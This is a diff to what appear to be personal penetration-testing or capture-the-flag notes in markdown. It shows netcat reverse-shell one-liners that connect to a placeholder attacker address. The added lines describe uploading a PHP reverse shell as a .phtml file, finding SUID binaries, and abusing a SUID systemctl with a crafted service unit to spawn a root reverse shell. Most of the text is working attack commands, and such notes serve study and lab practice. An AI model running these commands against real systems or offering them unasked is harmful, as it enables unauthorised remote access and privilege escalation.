@@ -30,8 +30,18 @@ reverse shells:
 nc -e /bin/bash <ip> <port>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 ```
+#### File inclusion for reverse shell
+[PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+Upload php reverse shell as `.phtml`, setup a nc listener, load the phtml location.
 
-Exploiting systemctl (SUID bit was set), reverse shell using netcat openbsd from systemctl service.
+#### Search for SUID bit
+```
+find / -perm /4000
+...
+/bin/systemctl
+```
+
+Exploiting systemctl, reverse shell using netcat openbsd from systemctl service.
 ```bash
 [Unit]
 Description=root-shell
@@ -47,4 +57,4 @@ WantedBy=multi-user.target
 /bin/systemctl start root-shell
 ```
 
-[PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
